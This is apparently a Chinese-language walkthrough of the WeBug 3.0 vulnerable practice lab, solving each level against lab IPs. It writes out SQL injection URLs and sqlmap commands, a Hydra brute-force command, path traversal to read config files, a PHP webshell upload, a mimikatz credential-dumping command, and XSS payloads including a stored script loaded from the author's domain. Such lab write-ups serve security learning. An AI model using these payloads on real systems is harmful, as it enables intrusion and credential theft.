---
title: WeBug3.0练习笔记
description: 在webug3.0的测试平台上测试后所写的一些测试笔记
date: 2019-02-25 15:32:06
---

## 第一关-很简单的一个注入

> 普通的GET注入

### 方法一

#### 工具

- Firefox 48.0
+ Firefox插件:
  - hackbar

#### 步骤

猜想当前表中列数

```
// 失败:
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= 2'order by 5 %23

...

// 成功:
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= 2'order by 4 %23

// 结论：表中存在4列属性
```

获取表

```
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1' union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database() %23
```

![获取表](/images/1_1.png)

获取当前数据库名称

```
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=‘-1' union select 1,database(),3,4 --'
```

![获取当前数据库名称](/images/1_2.png)

获取`flag`表的所有列

```
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1' union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'flag' %23
```

![获取flag表的所有列](/images/1_3.png)

获取`flag`表的中列的值

```
  http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid= -1' union select 1,flag,3,4 from flag %23
```

![获取flag表的中列的值](/images/1_4.png)


### 方法二

#### 工具

* python 2.7.15
* sqlmap

#### 步骤

获取当前数据库名称

```
python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid --current-db
```

![获取当前数据库名称](/images/1_5.png)

获取当前数据库的所有表

```
python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D  pentesterlab --tables
```

![获取当前数据库名称](/images/1_6.png)

获取`flag`表中的值

```
python sqlmap.py -u http://169.254.91.186/pentest/test/sqli/sqltamp.php?gid=1 -p gid -D pentesterlab -T flag --dump
```

![获取当前数据库名称](/images/1_7.png)

----

## 第二关-从图片中你能找到什么？

> 从图片中找到有用的信息

### 工具

* CMD
* 360压缩

### 步骤

1. 右键保存图片

2. 修改图片后缀名为zip

3. 解压得到txt文本文件

### 拓展

#### 资源
- 图片: 1.jpg
- 文本: 1.txt
#### 工具
- CMD
- 360压缩

#### 步骤

1. 准备一张图片和一个文本

![1.jpg与1.txt](/images/2_1.png)

2. 将`1.txt`压缩成`1.zip`

![压缩1.txt](/images/2_2.png)

3. 将`1.jpg`和`1.zip`合并成为`2.jpg`

```
copy /b 1.jpg+1.zip   2.jpg
```

![执行CMD命令](/images/2_3.png)

![结果](/images/2_4.png)

4. 将`2.jpg`的后缀改为`2.rar`，从`rar`压缩里面可以看到一个`1.txt`文件

改为`zip`的话，在`win10`上有时会出现错误，推荐`rar`

![结果](/images/2_5.png)

----

## 第三关-你看到了什么？

> 渗透网站的时候目录也很重要

### 工具

- 御剑
- MD5在线加密解密

### 步骤

获取当前`URL`的部分文件

```
  //目标链接:
  http://169.254.91.186/pentest/test/san/index33.htm
```

![得到test文件目录](/images/3_1.png)

访问`test`

![结果](/images/3_2.png)

尝试用`md5`加密`test`

![结果](/images/3_3.png)

访问经过16位加密后的test的网址

![结果](/images/3_4.png)

----

## 第四关-告诉你了FLANG是5位数

> 暴力破解登录

### 工具

- Firefox 48.0
+ Firefox插件:
  - hackbar
  - hydra
- user.txt
- password.txt

用 hackbar 尝试获取 Post data 值

```
  http://169.254.91.186/pentest/test/b2e16da5985ee1be/login.php
```

![hackbar](/images/4_1.png)

准备存放常见用户名的文本user.txt和存放常见密码的文本passwd.txt

使用user.txt用户名文本和passwd.txt文本文本对无验证码且弱口令的登陆页面进行暴力破解

```
  hydra -L user.txt -P passwd.txt -o output.log -vV -t 10  -f 169.254.91.186 http-post-form "/pentest/test/b2e16da5985ee1be/login.php:username=^USER^&pwd=^PASS^:login failure"
```

![结果](/images/4_2.png)

----

## 第五关-一个优点小小的特殊的注入

> 头部的一个注入

### 工具

- Firefox 48.0
+ Firefox 插件:
  - Modify Headers

### 步骤

使用 `Modify Headers` 来进行`HTTP`头注入，常见的有获取客户端`IP`,`http-client-ip`,`x_forwarded_for` 等

![使用Modify Headers 来进行HTTP头注入](/images/5_1.png)

![点击start并刷新页面](/images/5_2.png)

![可知当前表有4列](/images/5_3.png)

### 获取当前数据库名称

```sql
  union select 1,database(),3,4
```

![可知当前表有4列](/images/5_4.png)

获取当前表所在数据库的所有表

```sql
  union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
```

![获取当前表所在数据库的所有表](/images/5_5.png)

获取flag表所有列

```sql
  union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'flag'
```

![获取flag表所有列](/images/5_6.png)

获取flag表中某属性的值

```sql
  union select 1,flag,3,4 from flag
```

![获取flag表中flag的值](/images/5_7.png)

----

## 第六关-这关需要RMB购买哦

> 支付问题:用最少的钱去购买到一本书！

### 方法一

#### 步骤

密码在第七关的入口,也可以尝试暴力破解:

![获取账号密码](/images/6_1.png)

输入负数

![获取账号密码](/images/6_2.png)

### 方法二

#### 工具

- Burp Suite

#### 步骤

先开启`Burp Suite`的代理，截断包的发送，然后输入要购买的数量，然后点击购买

![开启代理](/images/6_3.png)

在Params处，可以看到发送的包的值

![查看包](/images/6_4.png)

抓包,改包

```
// 猜想:
  0.1 * 50 = 5
  0.2 * 100 = 20
  5 + 20 = 25
```

![改包](/images/6_5.png)

解除代理，查看结果

![改包结果](/images/6_6.png)

----

## 第七关-越权

### 工具

- Burp suite

### 步骤

使用入口提供的账号密码登录,点击修改密码

发现在密码修改页面的url中带有name字样

![change.php?name=tom](/images/7_1.png)

测试修改密码发现没有进行旧密码验证和当前用户判断

![修改密码后](/images/7_2.png)

修改url

![?name=admin](/images/7_3.png)

提交前，开启代理，点击提交，修改包，解除代理

![改包](/images/7_4_1.png)

![解除代理结果](/images/7_4.png)

![结果](/images/7_5.png)

----

## 第八关-CSRF

> 管理员每天晚上十点上线！

### 方法一

#### 工具

- Burp suite

#### 步骤

用`tom`登录,进入主页

![tom](/images/8_0.png)

点击“更改密码”

> 源php文件无法进行修改密码操作，已更改

![更改密码](/images/8_1.png)

源码已更正,允许修改密码,再次进入更改密码界面

![密码修改结果](/images/8_2.png)

开启代理，输入密码：`klklkl`，点击“更改密码”

![使用Burp Suite](/images/8_3.png)

修改`username`的值为`admin`，然后构造

![构造CSRF](/images/8_4.png)

制作对应的网页，或者test一下

![CSRF](/images/8_5.png)

制作网页

![等待点击](/images/8_6.png)

### 方法二

看了一眼源码，发现没有对当前用户进行判断，其实直接利用：http://169.254.91.186/pentest/test/4/change.php?name=admin然后更改密码就行。em....

----

## 第九关-URL跳转

> 能不能从我到百度那边去？

### 工具

- Firefox 48.0
- Firefox插件:
  + hackbar

### 步骤

没头绪，看源码

![webug源码](/images/9_1.png)

填写`?url=http://www.baidu.com`

![?url=http://www.baidu.com](/images/9_2.png)

跳转url

![尝试跳转](/images/9_3.png)

> 备注：若出现不安全链接提示，直接关闭代理即可

![关闭代理](/images/9_4.png)

----

## 第十关-文件下载

> 根据提示下载需要的文件

### 工具

- 御剑

- burp suite / hackbar

### 步骤

1. 点击进来发现目录不正确，回到上一级：`http://192.168.246.128/pentest/test/6/1d95a598d0bd1a3a/`

![](/images/mk-2020-03-17-20-54-25.png)

2. 发现 6 的目录下有 1 这个目录，但里面是空的

![](/images/mk-2020-03-17-20-55-13.png)

3. 用御剑扫描一下目录，发现 `download.php`

![](/images/mk-2020-03-17-20-55-29.png)

4. 访问 `download.php`：`http://192.168.246.128/pentest/test/6/1/download.php`

![](/images/mk-2020-03-17-20-56-54.png)

5. 点击下载，虽然下载不了，但是发现标题瞩目

![](/images/mk-2020-03-17-20-57-09.png)

6. 标题和数据库有关，联想刚刚扫描到的目录

![](/images/mk-2020-03-17-20-57-43.png)

7. 扫描目录，得到 `config.php`

![](/images/mk-2020-03-17-20-58-00.png)

8. 一般不直接访问，这里直接访问，发现还有语法错误

![](/images/mk-2020-03-17-20-58-10.png)

此时，有两种方法获取账号密码：

#### 方法一

9. 回到下载的地方，抓一下包

![](/images/mk-2020-03-17-20-59-38.png)

10. 根据`config.php`所在的相对路径，修改`value`值：`../../../pentest/test/6/1/db/Config.php`，指向`config.php`

![](/images/mk-2020-03-17-21-00-24.png)

11. 取消代理，获取文件

![](/images/mk-2020-03-17-21-00-40.png)

12. 得到有关账号密码的信息

![](/images/mk-2020-03-17-21-00-58.png)

#### 方法二

9. 因为用的是`get`方式，所以也可以通过修改`url`来达到目的

![](/images/mk-2020-03-17-21-01-21.png)

10. 直接使用`hackbar`构建`url`：`../../../pentest/test/6/1/db/Config.php`，得到`config.php`文件

![](/images/mk-2020-03-17-21-01-43.png)

11. 得到有关账号密码的信息

![](/images/mk-2020-03-17-21-01-59.png)

----

## 第十一关-我和上一关有点像

> boom，沙卡拉卡！

### 工具

- 御剑

- burp suite / hackbar

### 步骤

1. 看起来和第十关有点类似

![](/images/mk-2020-03-17-21-18-27.png)

2. 用御剑扫描当前目录

![](/images/mk-2020-03-17-21-18-59.png)

3. 继续扫描`db`目录

![](/images/mk-2020-03-17-21-19-09.png)

4. 用的是`post`，那只能改`post`包了

![](/images/mk-2020-03-17-21-19-34.png)

5. 抓包，改包，获得`config.php`

![](/images/mk-2020-03-17-21-19-48.png)

6. 查看`config.php`文件，可以看到类似账号密码的信息

![](/images/mk-2020-03-17-21-20-02.png)

----

## 第十二关-我系统密码忘记了！

> 请帮我找回在 D 盘下

### 工具

- 菜刀

- mimikatz.exe

### 步骤

1. 用之前的 `tom` 来登陆

![](/images/mk-2020-03-17-21-28-58.png)

2. 主页

![](/images/mk-2020-03-17-21-29-12.png)

3. 发现上传功能，构建 `php`，上传

![](/images/mk-2020-03-17-21-29-30.png)

4. 上传 `go.php` 成功，在 8 目录下的 `upload` 文件夹中

![](/images/mk-2020-03-17-21-29-46.png)

5. 在菜刀空白处右键新建连接

![](/images/mk-2020-03-17-21-29-59.png)

6. 填写 `php` 所在 `web` 树目录即 `php` 文件中 `post` 的值，由于 `go.php` 中填写的是 `ee`，所以这里也是，完成后，添加

![](/images/mk-2020-03-17-21-35-24.png)

7. 选择刚刚创建的 `shell`，右键选择文件管理

![](/images/mk-2020-03-17-21-35-37.png)

8. 可以看到已经可以管理服务器的文件，通过右键可以进行下载等操作

![](/images/mk-2020-03-17-21-35-54.png)

9. 由于题目要求是找回系统账号密码，遵守游戏规则，使用 `mimikatz` 来获取系统账号密码，先上传 `mimikatz` 组件。

![](/images/mk-2020-03-17-21-36-10.png)

10. `mimikatz` 使用起来也非常简单，提取 `Windows` 系统的明文密码只需两行命令：

    提权：`privilege::debug`

    输出系统账号密码：`sekurlsa::logonpasswords`

11. 右键 `shell`，选择虚拟终端，执行命令：`mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" > pssword.txt`，执行 `mimikatz`，提权并获取系统账号密码，最后导出到 `txt` 文本上

![](/images/mk-2020-03-17-21-37-27.png)

12. 在文件管理中可以看到 `password.txt` 文件

![](/images/mk-2020-03-17-21-37-37.png)

13. 可以下载或者双击打开查看，成功获取系统账号密码

![](/images/mk-2020-03-17-21-37-50.png)

### 附加

1. 可以在配置中对数据库的信息进行配置，以获取对数据库操作的权限

![](/images/mk-2020-03-17-21-38-19.png)

2. 选择刚刚修改的 `shell`，右键选择数据库管理

![](/images/mk-2020-03-17-21-38-29.png)

----

## 第十三关-XSS

> 看看你能给我带来什么惊喜

### 工具

- hackbar

### 步骤

1. 主页：`http://192.168.246.128/pentest/test/9/`

![](/images/mk-2020-03-17-21-44-18.png)

2. 666

![](/images/mk-2020-03-17-21-44-33.png)

3. 555

![](/images/mk-2020-03-17-21-44-41.png)

4. 反射型`XSS`，构建`<script>alert(document.cookie)</script>`

![](/images/mk-2020-03-17-21-45-11.png)

----

## 第十四关-存储型XSS

> suprise！

### 步骤

1. 主页：发现没有检测对输入进行过滤 js

![](/images/mk-2020-03-17-21-47-56.png)

2. 存储型 XSS：构建一个`<script></script>`，这里使用的是`<script src="xxx.js"></script>`，此处为本人的域名下的一个 js 脚本，用以下载文件

![](/images/mk-2020-03-17-21-48-08.png)

3. 此处的 js 操作执行会下载一个东西，由于是存储型 xss，每个访客访问该网址都会默认下载一个东西

![](/images/mk-2020-03-17-21-49-57.png)

----

## 第十五关-什么？图片上传不了？

> 上传不了图片怎么办？

### 工具

- 御剑

- burp suite

### 步骤

1. 要求上传图片

![](/images/mk-2020-03-17-22-01-05.png)

2. 上传图片

![](/images/mk-2020-03-17-22-01-22.png)

3. 上传非图片格式

![](/images/mk-2020-03-17-22-01-37.png)

4. 验证一下是否上传成功，猜一下是否上传到当前目录，扫描目录，发现 `upload` 文件夹

![](/images/mk-2020-03-17-22-01-57.png)

5. 把上传的文件加入 `DIR.txt` 字典中，然后扫描一下 `upload` 文件夹，是否存在刚刚上传的文件。发现是个坑。显然图片可以经过了验证，但同样拒绝了图片的上传。

![](/images/mk-2020-03-17-22-02-14.png)

6. 图片格式：`Content-Type: image/png`

![](/images/mk-2020-03-17-22-02-28.png)

7. 上传 `php` 文件，把 `Content-Type: application/octet-stream` 修改为 `Content-Type: image/png`

![](/images/mk-2020-03-17-22-02-43.png)

8. 成功上传，准备执行它

![](/images/mk-2020-03-17-22-02-56.png)

9. 成功执行

![](/images/mk-2020-03-17-22-03-07.png)

----

## 第十六关-明天双十一

> 我从公司网络去剁手了

### 工具

- burp suite

### 步骤

1. 正常模式：`http://192.168.246.128/pentest/test/12/`

![](/images/mk-2020-03-17-22-07-13.png)

2. 点击一下`Go`，发现`url`多了一个`?url=`

![](/images/mk-2020-03-17-22-07-26.png)

3. 点击`pass`则显示

![](/images/mk-2020-03-17-22-07-38.png)

4. 输入`www.taobao.com`看看

![](/images/mk-2020-03-17-22-07-57.png)

5. 显示只允许特定`ip`

![](/images/mk-2020-03-17-22-08-08.png)

6. 输入`10.10.10.10`后则显示

![](/images/mk-2020-03-17-22-08-22.png)

7. 输入`www.taobao.com`，查看`burp`

![](/images/mk-2020-03-17-22-08-33.png)

8. 把`HOST`改成`10.10.10.10`

   `Host`：初始`URL`中的主机和端口。

![](/images/mk-2020-03-17-22-08-59.png)

9. 显示`nonono`

![](/images/mk-2020-03-17-22-09-15.png)

10. 把`Referer`改为`www.taobao.com`

    `HTTP Referer`是`header`的一部分，当浏览器向`web`服务器发送请求的时候，一般会带上`Referer`，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。

    ![](/images/mk-2020-03-17-22-09-41.png)

11. em...

![](/images/mk-2020-03-17-22-09-56.png)

12. 看源码，发现是我的来源应该是`www.baidu.com`

![](/images/mk-2020-03-17-22-10-12.png)

13. em...把`Refer`改为`http://www.baidu.com`，此时`GET`还是`www.taobao.com`，`Host`为`10.10.10.10`

![](/images/mk-2020-03-17-22-10-28.png)

14. em...得到了`flag`

![](/images/mk-2020-03-17-22-11-28.png)

15. 在`flag`中输入：`83242lkjKJ(*&*^*&k0`

![](/images/mk-2020-03-17-22-11-40.png)

----

## 中级第一关-出来点东西吧

> ../../etc/passwd

### 工具

- 御剑

### 步骤

1. 想看看外面的世界，明显存在某些可以访问其他地方的东西

![](/images/mk-2020-03-17-22-30-59.png)

2. 依次把 `usa.php` 等加入字典，更新 `DIR.txt`。扫描当前目录。发现 `cc` 目录和 `img` 目录。

![](/images/mk-2020-03-17-22-31-19.png)

3. 扫描 `cc` 和 `img` 目录，发现类似配置文件：`config.php`

![](/images/mk-2020-03-17-22-31-33.png)

4. 尝试利用文件任意读取，访问 `config.php`，得到一些信息，标题显示的却是“上一道题目的地址”，真奇怪

   ![](/images/mk-2020-03-17-22-31-49.png)

   显示图片`?country=cc/usa.php`

   ![](/images/mk-2020-03-17-22-32-01.png)

5. 从 `3306` 端口，推测可能是数据库账号密码，访问 `phpmyadmin`，输入刚刚获取的信息，发现登陆失败

![](/images/mk-2020-03-17-22-32-29.png)

----

## 中级第二关-提交方式是怎么样的啊？

> pass！

### 工具

- 御剑

- burp suite

### 步骤

1. 主页

![](/images/mk-2020-03-17-22-35-47.png)

2. 扫一下目录，发现 config.php,f 直接访问发现错误。

![](/images/mk-2020-03-17-22-36-13.png)

3. 抓包

![](/images/mk-2020-03-17-22-37-07.png)

4. 改包

![](/images/mk-2020-03-17-22-37-20.png)

5. 发现存在任意文件读取漏洞

![](/images/mk-2020-03-17-22-37-32.png)

----

## 中级第三关-我还是一个注入

> 怎么又 TM 注入！

### 工具

- burp suite

### 步骤

1. 主页

   ![](/images/mk-2020-03-17-22-40-43.png)

2. 试试`X-Forwarder-for`注入，发现没反应

   ![](/images/mk-2020-03-17-22-40-54.png)

3. 试试`Host`头注入

   ![](/images/mk-2020-03-17-22-41-22.png)

4. 得到回显，但是不是 3 列

   ![](/images/mk-2020-03-17-22-41-37.png)

5. 是 4 列

   ![](/images/mk-2020-03-17-22-41-48.png)

6. 构造 `sql` 注入语句，得到当前数据库的所有表

   ![](/images/mk-2020-03-17-22-41-57.png)

7. 拿 `flag` 的值

   ![](/images/mk-2020-03-17-22-42-08.png)

8. 成功

   ![](/images/mk-2020-03-17-22-42-24.png)

9. 拿账号密码

   ![](/images/mk-2020-03-17-22-42-38.png)

----

## 中级第四关-APK里面有一个flag

> 看看 apk

### 工具

- 360 解压
- android-killer

### 步骤

#### 下载 apk 文件

点击会下载一个 apk 文件

![](/images/mk-2020-03-17-22-46-44.png)

#### 安装 apk 测试

1. 在手机上安装 apk

![](/images/mk-2020-03-17-22-47-54.png)

2. 似乎要点击 300 下

![](/images/mk-2020-03-17-22-48-18.png)

3. 中途退出要重新点击，别问我怎么知道

![](/images/mk-2020-03-17-22-48-34.png)

4. 常规获取

![](/images/mk-2020-03-17-22-48-55.png)

5. 累死人的操作，把机械点击操作交给模拟器吧

![](/images/mk-2020-03-17-22-49-11.png)

6. 看起来是`md5`加密的东西

![](/images/mk-2020-03-17-22-49-25.png)

7. 解密，原来明文是 `flagisme`

![](/images/mk-2020-03-17-22-49-37.png)

#### 使用 android-killer

用`android-killer`打开`test.apk`,对`smali`语法不熟悉，换一下方式

![](/images/mk-2020-03-17-22-50-27.png)

#### 解压 apk

1. 准备使用工具反编译，先把`test.apk`改成`test.zip`，进行解压

![](/images/mk-2020-03-17-22-51-07.png)

2. 解压得到

![](/images/mk-2020-03-17-22-51-18.png)

3. 准备工具，分别解压

![](/images/mk-2020-03-17-22-51-31.png)

4. 把`test.zip`解压出来的文件夹中把`classes.dex`复制到刚刚解压出来的`dex2jar-2.0`文件夹中

![](/images/mk-2020-03-17-22-51-44.png)

5. 执行命令：`d2j-dex2jar classes.dex`
   把`classes.dex`编译成`jar`包

![](/images/mk-2020-03-17-22-51-54.png)

6. 得到`jar`包：`classes-dex2jar.jar`

![](/images/mk-2020-03-17-22-52-17.png)

7. 打开刚刚解压出来的`jd-gui-windows-1.4.0`的文件夹中的`jd-gui.exe`，点击`File`->`Open File`,打开`classes-dex2jar.jar`

![](/images/mk-2020-03-17-22-52-27.png)

8. 查看`classes-dex2jar.jar`包中的入口文件：`MainActivity.class`，发现关键语句

![](/images/mk-2020-03-17-22-52-40.png)

9. 分析得到，是四个字符串经过`BASE64`加密再拼接在一起的，组合一下字符串：`YWZlOGU5MWI=NGM1NGFkOGViMzA0M2UzNjY=ZGJjYTA1Zg==`拿去进行`BASE64`解密

![](/images/mk-2020-03-17-22-52-51.png)

10. 解密得到：`afe8e91b4c54ad8eb3043e366dbca05f`

![](/images/mk-2020-03-17-22-53-01.png)

### Q&A

Q：为什么图片颜色怪怪的？

A：当前图片是从 xmind 文件中直接拷贝出来的，使用的 xmind 版本为 XMind 8 Update 9，其中 xmind 文件的图片颜色显示正常。
